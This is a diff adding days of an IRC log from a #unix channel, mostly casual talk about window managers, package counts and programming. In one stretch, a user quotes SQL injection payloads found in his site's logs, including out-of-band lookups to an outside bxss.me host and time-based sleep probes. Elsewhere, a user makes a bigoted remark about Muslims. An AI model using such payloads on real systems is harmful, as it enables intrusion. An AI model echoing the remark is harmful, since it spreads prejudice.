@@ -523,3 +523,228 @@
 2018-12-17 12:59:22	--	Channel created on Thu, 08 Mar 2018 16:20:30
 2018-12-17 13:21:29	<--	Mossepo (~Mossepo@nix-47CF6961.csc.fi) has quit (WeeChat 2.2)
 2018-12-17 13:21:43	-->	Mossepo (~Mossepo@nix-47CF6961.csc.fi) has joined #unix
+2018-12-17 19:27:22	-->	Ergo (~nathaniel@nix-40DB132F.ip.xs4all.nl) has joined #unix
+2018-12-17 19:27:22	--	Topic for #unix is "Praise the GNU/Lord"
+2018-12-17 19:27:22	--	Topic set by z3bra on Thu, 01 Nov 2018 01:35:17
+2018-12-17 19:27:22	--	Channel #unix: 62 nicks (4 ops, 1 halfops, 4 voices, 53 normals)
+2018-12-17 19:27:24	--	Channel created on Thu, 08 Mar 2018 16:20:30
+2018-12-17 19:30:46	<--	kkmk (~kkmk@nix-7D0F4A0.dynamic.chello.pl) has quit (Ping timeout: 180 seconds)
+2018-12-17 19:33:00	-->	kkmk (~kkmk@nix-7D0F4A0.dynamic.chello.pl) has joined #unix
+2018-12-17 19:55:43	seth	how's it going
+2018-12-17 20:53:47	-->	Ergo (~nathaniel@nix-40DB132F.ip.xs4all.nl) has joined #unix
+2018-12-17 20:53:47	--	Topic for #unix is "Praise the GNU/Lord"
+2018-12-17 20:53:47	--	Topic set by z3bra on Thu, 01 Nov 2018 01:35:17
+2018-12-17 20:53:47	--	Channel #unix: 62 nicks (4 ops, 1 halfops, 4 voices, 53 normals)
+2018-12-17 20:53:49	--	Channel created on Thu, 08 Mar 2018 16:20:30
+2018-12-17 20:58:47	seth	have you guys switched from a 'barebones' window manager back to something like gnome
+2018-12-17 20:58:53	seth	and be blown away by how nice it looks?
+2018-12-17 21:02:11	vifino	nope. i like my minimalism.
+2018-12-17 21:09:21	Ergo	why would i do that 
+2018-12-17 21:09:35	Ergo	for me its not bout minimalism , but it doesnt really bring me anything i want 
+2018-12-17 21:20:19	seth	I have the resources for it, gnome feels so smooth compared to bspwm
+2018-12-17 21:20:37	seth	clicking on the notifications actually brings up the calling window, unlike with dunst
+2018-12-17 21:20:41	Ergo	its not even about resources
+2018-12-17 21:20:53	Ergo	i have a R5 2600, 16 gigs of ram and a amd r9 290 
+2018-12-17 21:21:15	Ergo	but i think gnome looks ugly and is bloated. if i want to use a DE i would use KDE or xfce 
+2018-12-17 21:21:35	seth	how is it ugly, there's only one status bar... I have the same thing on bspwm with lemonbar
+2018-12-17 21:21:54	Ergo	i mean you can make it look better sure 
+2018-12-17 21:22:27	seth	gnome-shell is using a whopping 355 MB of RSS memory
+2018-12-17 21:22:31	seth	discord needs more just to be open
+2018-12-17 21:22:46	Ergo	i just prefer 2bwm in general 
+2018-12-17 21:22:47	seth	so I don't see where you're getting 'bloated' from
+2018-12-17 21:22:48	Ergo	i love that wm 
+2018-12-17 21:22:59	Ergo	i mean it comes with terminal, file manager etc etc 
+2018-12-17 21:23:04	Ergo	it basically comes with a load of crap that i dont need 
+2018-12-17 21:23:16	seth	I use urxvt, I don't touch the built in terminal
+2018-12-17 21:23:23	Ergo	sure, but its still installed 
+2018-12-17 21:23:25	seth	and I believe that stuff is marked 'optional'
+2018-12-17 21:25:20	seth	the only problem I've run into so far was the 'suspend' feature freezing my windows VFIO VM
+2018-12-17 21:25:32	seth	which was a simple click on a toggle to disable
+2018-12-17 21:38:06	@xero	seth: nope
+2018-12-17 21:38:16	@xero	minimal hipster wm masterrice
+2018-12-17 21:38:22	seth	lol
+2018-12-17 21:39:00	seth	I like bspwm
+2018-12-17 21:39:27	@xero	im post tiling. 2bwm is where it's at
+2018-12-17 21:40:01	seth	I like tiling for programming, but shit that doesn't have tiling in mind just breaks
+2018-12-17 21:40:07	seth	like steam for instance, windows pop up everywhere
+2018-12-17 21:40:12	@xero	mhm
+2018-12-17 21:40:25	@xero	but i mostly just use term + browser w/ a little dmenu glue
+2018-12-17 21:41:32	@xero	but i have almost a 1000 pkgs installed still :P
+2018-12-17 21:41:42	seth	I don't even know what I'm up to
+2018-12-17 21:41:54	seth	lots of aur stuff to try the latest hotness
+2018-12-17 21:41:59	@xero	`{pacman,yay} -Qqs`
+2018-12-17 21:42:14	@xero	i have a bunch of work crap on this box
+2018-12-17 21:42:30	@xero	shit i needed once then never uninstalled
+2018-12-17 21:42:41	@xero	almost spring cleaning time though
+2018-12-17 21:43:36	seth	yeah I was thinking of just redoing the whole thing, but that will wait til I build my threadripper multi gaming station
+2018-12-17 21:44:30	seth	1462 packages
+2018-12-17 21:44:32	seth	oh my
+2018-12-17 21:46:41	@xero	95 of my packages are haskell :/
+2018-12-17 21:50:54	%mort	???????
+2018-12-17 21:52:34	@xero	o/
+2018-12-17 22:13:58	seth	hello mort
+2018-12-17 22:14:29	seth	we were just talking about how gnome is complete garbage because it comes packaged with a terminal :P
+2018-12-17 22:15:30	-->	feiticeir (~ceiro@nix-B07B6100.hsd1.ga.comcast.net) has joined #unix
+2018-12-17 22:30:29	@xero	https://packages.ubuntu.com/xenial/ubuntu-gnome-desktop
+2018-12-17 22:30:34	@xero	yeah... just a terminal :P
+2018-12-17 22:31:41	biniar	so MUCH moarz
+2018-12-17 22:31:50	seth	//www.archlinux.org/groups/x86_64/gnome/ /
+2018-12-17 22:31:53	seth	t
+2018-12-17 22:31:54	seth	wat
+2018-12-17 22:32:00	seth	https://www.archlinux.org/groups/x86_64/gnome/
+2018-12-17 22:32:33	seth	doesn't look too extensive
+2018-12-17 22:32:53	@xero	67 deps
+2018-12-17 22:33:16	@xero	2bwm has 5
+2018-12-17 22:33:27	@xero	just the necessary xcb libs
+2018-12-17 22:33:37	@xero	then it's diy after that
+2018-12-17 22:33:40	@xero	the way i like it ;D
+2018-12-17 22:34:05	biniar	<3
+2018-12-17 22:34:59	biniar	but misleading with the two as the first charcter in the name :P
+2018-12-17 22:35:35	seth	yeah but you need notifications .. which is probably 3 packages, the launcher, which is probably 10 or so, the bar, which is a few, et cetera
+2018-12-17 22:35:49	biniar	nah bruh
+2018-12-17 22:35:51	seth	rofi uses 17 dependent packages
+2018-12-17 22:36:06	seth	https://www.archlinux.org/packages/community/x86_64/rofi/
+2018-12-17 22:36:09	seth	that's just a launcher
+2018-12-17 22:36:15	seth	or task switcher
+2018-12-17 22:37:06	@xero	i use a dmenu fork that uses 3. xft, git, and xinerama
+2018-12-17 22:37:15	<--	Mossepo (~Mossepo@96A6718E.18B33B25.E5AF0973.IP) has quit (WeeChat 2.3)
+2018-12-17 22:38:12	biniar	can u link repo?
+2018-12-17 22:38:53	@xero	https://github.com/xero/dmenu
+2018-12-17 22:39:04	@xero	it's basically https://aur.archlinux.org/packages/dmenu-ee-git/
+2018-12-17 22:39:07	biniar	sweet, thanks... going to check it out
+2018-12-17 22:45:04	Ergo	im still using rofi 
+2018-12-17 22:45:13	Ergo	just what im used to, prolly doesnt matter much either way 
+2018-12-17 22:45:37	biniar	I canb respect that
+2018-12-17 22:45:40	biniar	can*
+2018-12-17 22:45:58	Ergo	talking bout packages, im on 485 while having all devs i need for steam and wine 
+2018-12-17 22:46:00	Ergo	i think 
+2018-12-17 22:56:32	acg	i won't even try that running Ubuntu, with gnome, working with a few programming languages/frameworks
+2018-12-17 22:56:34	acg	blame work
+2018-12-17 22:57:07	acg	could remove gnome tho
+2018-12-17 23:08:02	@xero	ye i have a shit ton of java, ruby, python crap for work i dont have on my personal laptop
+2018-12-17 23:27:25	<--	sin (~sin@nix-502D8A6D.fz.is) has quit (Read error)
+2018-12-17 23:27:58	-->	sin (~sin@nix-502D8A6D.fz.is) has joined #unix
+2018-12-17 23:42:27	Ergo	yee i dont code, which probably helps my package count :) 
+2018-12-17 23:48:53	%mort	> yay -Qqs | wc -l
+2018-12-17 23:48:53	%mort	1018
+2018-12-17 23:52:09	premysl	861
+2018-12-17 23:55:09	%mort	I wonder, would it make sense to statically link libraries which are huge and likely only needed by a small amount of applications, and those applications likely only need a small part of them
+2018-12-17 23:55:51	%mort	well, it would certainly make sense, but would it be possible to do that somehow automatically or dynamically? Probably a terrible idea, but maybe interesting
+2018-12-17 23:57:10	-->	wizzyceir (~ceiro@nix-B07B6100.hsd1.ga.comcast.net) has joined #unix
+2018-12-17 23:59:21	<--	feiticeir (~ceiro@nix-B07B6100.hsd1.ga.comcast.net) has quit (Ping timeout: 180 seconds)
+2018-12-18 00:48:28	Ergo	owo 
+2018-12-18 02:08:03	Roserin	uwu
+2018-12-18 02:51:44	Ergo	i actually didnt mean to send that in this chat lol 
+2018-12-18 02:51:45	Ergo	oh well 
+2018-12-19 15:14:38	-->	Ergo (~nathaniel@nix-40DB132F.ip.xs4all.nl) has joined #unix
+2018-12-19 15:14:38	--	Topic for #unix is "Praise the GNU/Lord"
+2018-12-19 15:14:39	--	Topic set by z3bra on Thu, 01 Nov 2018 01:35:17
+2018-12-19 15:14:39	--	Channel #unix: 61 nicks (4 ops, 1 halfops, 4 voices, 52 normals)
+2018-12-19 15:14:40	--	Channel created on Thu, 08 Mar 2018 16:20:30
+2018-12-19 15:39:14	<--	Mossepo (~Mossepo@nix-47CF6961.csc.fi) has quit (WeeChat 2.2)
+2018-12-19 16:07:13	@xero	o/
+2018-12-19 16:07:53	%mort	no matching function for call to 'std::unique_ptr<v4ldev::EncodedFrame>::reset(std::remove_reference<std::unique_ptr<v4ldev::EncodedFrame>&>::type)'
+2018-12-19 16:07:55	%mort	note: candidate: 'void std::unique_ptr<_Tp, _Dp>::reset(std::unique_ptr<_Tp, _Dp>::pointer) [with _Tp = v4ldev::EncodedFrame; _Dp = std::default_delete<v4ldev::EncodedFrame>; std::unique_ptr<_Tp, _Dp>::pointer = v4ldev::EncodedFrame*]'
+2018-12-19 16:07:58	%mort	I fucking love C++
+2018-12-19 16:55:58	dcat	mort: good job
+2018-12-19 16:56:29	dcat	but yeah, you'd wait for SIGCHLD
+2018-12-19 17:05:05	@z3bra	o/
+2018-12-19 17:14:10	seth	what up
+2018-12-19 17:28:57	biniar	\o
+2018-12-19 17:31:01	-->	Mossepo (~Mossepo@96A6718E.18B33B25.E5AF0973.IP) has joined #unix
+2018-12-19 17:33:03	dcat	sup z3bra seth and biniar 
+2018-12-19 17:36:32	%mort	dcat: you don't have to wait for sigchld though, because waitpid works on processes which have exited
+2018-12-19 17:39:55	dcat	are you talking about the parent or child?
+2018-12-19 17:41:18	@xero	so when i catch someone hacking one of our sites at work
+2018-12-19 17:41:35	@xero	we block the traffic and reply with a 418 header
+2018-12-19 17:41:44	@xero	makes me chuckle 
+2018-12-19 17:42:08	@xero	but "mass exploitation" tools dont seem to realize we're blocking them and they just keep sending payloads for me to analize 
+2018-12-19 17:42:18	@xero	here's some funny routes i've seen this morning:
+2018-12-19 17:42:25	@xero	/men/apparel/graphics?fabric|fab=18655&limit=all&neckline|nec=18869;copy%20(select%20'')%20to%20program%20'nslookup%20dns.sqli.%5c055653.88537-9465.88537.a6d6c.%5c1.bxss.me'&size|siz=1535
+2018-12-19 17:42:44	@xero	trying to call nslookup on dns.sqli.c1.bxss.me
+2018-12-19 17:42:51	@xero	/men/apparel/graphics?limit=if(now()=sysdate()%2csleep(10)%2c0)/*'XOR(if(now()=sysdate()%2csleep(10)%2c0))OR'\x22XOR(if(now()=sysdate()%2csleep(10)%2c0))OR\x22*/&size|siz=1535
+2018-12-19 17:43:59	@xero	/women/bags/backpacks?email=VqjoQBq2'));select%20pg_sleep(9);%20--%20
+2018-12-19 17:44:09	@xero	/women/bags/backpacks?email=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'\x22%2b(select(0)from(select(sleep(9)))v)%2b\x22*/
+2018-12-19 17:44:27	@xero	cheezy "ddos" attempts
+2018-12-19 17:46:34	@xero	/sendfriend/product/send/id/27474/cat_id/1753?___store='%7c%7cUTL_INADDR.get_host_address('dns.'%7c%7c'sqli.055653.88537-22595.88537.07c68.1.bxss'%7c%7c'.me')%7c%7c'
+2018-12-19 17:47:23	kirch	I wonder how many "hackers" just run whatever from metasploit
+2018-12-19 17:47:43	kirch	I know skiddies love to run rootkits on windows boxes ?\_(?)_/? 
+2018-12-19 17:47:55	@xero	https://www.acunetix.com/vulnerability-scanner/acumonitor-technology/
+2018-12-19 17:48:00	@xero	this is the tool they're uning
+2018-12-19 17:48:08	@xero	s/uning/using/
+2018-12-19 17:48:30	@xero	bxss.me == Blind XSS
+2018-12-19 17:48:52	@xero	it's just scanning and throwing hail mary requests at us
+2018-12-19 17:57:58	aaro	xero: heh that makes me remember the IIS vulnerabilities in the old days :)
+2018-12-19 18:09:57	dcat	how about
+2018-12-19 18:10:13	dcat	making websites fit every use-case out there
+2018-12-19 18:10:16	dcat	is stupid
+2018-12-19 18:12:01	dcat	I mean, they do all of this fancy-ass css and javascript shit
+2018-12-19 18:12:11	dcat	but 90% of the time, I'm just in reader mode on my phone
+2018-12-19 18:12:16	kirch	look, if you can't play games and check your email from my website, what's the point?
+2018-12-19 18:12:38	dcat	if your content is such shit that you have to make it into a minigame
+2018-12-19 18:12:44	dcat	don't put your shit out there
+2018-12-19 18:22:33	@xero	dcat's on some rob pike shit
+2018-12-19 18:22:34	@xero	https://twitter.com/rob_pike/status/1075163975875055616
+2018-12-19 18:23:35	dcat	pike seems to know what he's doing
+2018-12-19 18:23:42	dcat	shame he had to go and fuck up golang
+2018-12-19 20:45:09	premysl	Fuck up?
+2018-12-19 20:45:14	premysl	Better than ever.
+2018-12-19 21:30:01	premysl	Anyway, in the past hour, I've closed several sites prematurely because they annoyed the shit out of me (including one where reader mode didn't work).
+2018-12-19 21:42:02	dcat	premysl: he fucked up the syntax
+2018-12-19 21:43:40	premysl	I don't have a problem with it now.
+2018-12-19 21:57:06	<--	Mossepo (~Mossepo@96A6718E.18B33B25.E5AF0973.IP) has quit (WeeChat 2.3)
+2018-12-19 22:43:14	-->	naka (~nakahara@nix-94E6108.clients.your-server.de) has joined #unix
+2018-12-20 00:30:38	%mort	dcat: what parts of the syntax are fucked up? 
+2018-12-20 00:31:03	%mort	is it the types coming after the variable name?
+2018-12-20 02:45:19	-->	neeasade (~neeasade@nix-71C941F0.ks.ks.cox.net) has joined #unix
+2018-12-20 05:10:12	<--	naka (~nakahara@nix-94E6108.clients.your-server.de) has quit (Ping timeout: 180 seconds)
+2018-12-20 05:10:27	-->	naka (~nakahara@nix-94E6108.clients.your-server.de) has joined #unix
+2018-12-20 06:48:10	@venam	:w
+2018-12-20 07:12:01	Roserin	:wq
+2018-12-20 08:36:55	premysl	:x
+2018-12-20 09:30:22	%mort	:wq is superior to :x
+2018-12-20 09:30:23	@venam	https://www.amazon.com/Apricorn-Hardware-Encrypted-Validated-ASK3Z-128GB/dp/B01N4U7GNA/ref=cm_cr_arp_d_product_top?ie=UTF8&th=1
+2018-12-20 10:03:08	-->	vxid (~vxid@2E8D9A68.EA278808.DD7802F5.IP) has joined #unix
+2018-12-20 10:54:09	<--	vxid (~vxid@2E8D9A68.EA278808.DD7802F5.IP) has quit (Lost terminal)
+2018-12-20 11:37:33	<--	zachary12 (~zachary12@9DDDCF64.C517A718.1DE985E9.IP) has quit (Ping timeout: 180 seconds)
+2018-12-20 11:37:42	-->	zachary12 (~zachary12@9DDDCF64.C517A718.1DE985E9.IP) has joined #unix
+2018-12-20 11:53:28	pyrtbrd	morning nixers
+2018-12-20 12:05:35	%mort	hi
+2018-12-20 12:27:21	acg	morniiing
+2018-12-20 12:29:23	pyrtbrd	how are we all?
+2018-12-20 12:30:26	%mort	I just discovered that my header guard had a typo
+2018-12-20 12:30:42	%mort	`#ifndef v4L2_FRAME_H #define V4L2_FRAME_H`
+2018-12-20 12:30:52	acg	nice guard
+2018-12-20 13:21:26	<--	f48ds2 (~f48ds2@nix-2D792AF2.teemer.volia.net) has quit (Ping timeout: 180 seconds)
+2018-12-20 13:24:18	-->	Mossepo (~Mossepo@nix-47CF6961.csc.fi) has joined #unix
+2018-12-20 14:04:41	@z3bra	oi
+2018-12-20 14:04:51	acg	z3bra: how's it going?'
+2018-12-20 14:05:25	@z3bra	fine & you?
+2018-12-20 14:06:23	acg	good, just arrived my office
+2018-12-20 14:08:04	acg	been working on starting a youtube channel on the side. A bit personal and about free software / open-source community for spanish speakers
+2018-12-20 14:36:17	<--	Mossepo (~Mossepo@nix-47CF6961.csc.fi) has quit (WeeChat 2.2)
+2018-12-20 17:37:34	@xero	o/
+2018-12-20 17:46:18	-->	Mossepo (~Mossepo@96A6718E.18B33B25.E5AF0973.IP) has joined #unix
+2018-12-20 17:50:06	acg	sup
+2018-12-20 18:01:10	pyrtbrd	hope nobody is trying to fly into or out of gatwick today!
+2018-12-20 18:01:39	pyrtbrd	https://www.theguardian.com/uk-news/2018/dec/19/gatwick-flights-halted-after-drone-sighting
+2018-12-20 19:41:53	<--	Mossepo (~Mossepo@96A6718E.18B33B25.E5AF0973.IP) has quit (WeeChat 2.3)
+2018-12-20 19:48:43	--	irc: disconnected from server
+2018-12-20 19:48:55	-->	Ergo (~nathaniel@nix-40DB132F.ip.xs4all.nl) has joined #unix
+2018-12-20 19:48:55	--	Topic for #unix is "Praise the GNU/Lord"
+2018-12-20 19:48:55	--	Topic set by z3bra on Thu, 01 Nov 2018 01:35:17
+2018-12-20 19:48:55	--	Channel #unix: 61 nicks (4 ops, 1 halfops, 4 voices, 52 normals)
+2018-12-20 19:48:57	--	Channel created on Thu, 08 Mar 2018 16:20:30
+2018-12-20 19:58:54	dcat	probably muslim terrorists
+2018-12-20 19:58:58	dcat	kiddy edition
+2018-12-20 20:50:31	pyrtbrd	i like the response from the defence secetary when asked what the armed forces' involvment would be
+2018-12-20 20:50:44	pyrtbrd	"we can't reveal that at this time"
+2018-12-20 20:51:18	@xero	 ___  _  ___
+2018-12-20 20:51:18	@xero	 ))_) )) ))_)
+2018-12-20 20:51:18	@xero	 ((`\ (( ((
+2018-12-20 20:51:55	pyrtbrd	somebody is in for a *bad* day
+2018-12-20 21:52:38	@xero	https://en.wikipedia.org/wiki/C18_(C_standard_revision)
+2018-12-20 21:57:17	@xero	http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2244.htm
+2018-12-20 22:40:36	vifino	C18, waht.
+2018-12-20 22:52:27	@xero	ikr?
+2018-12-20 22:52:30	@xero	i had no idea
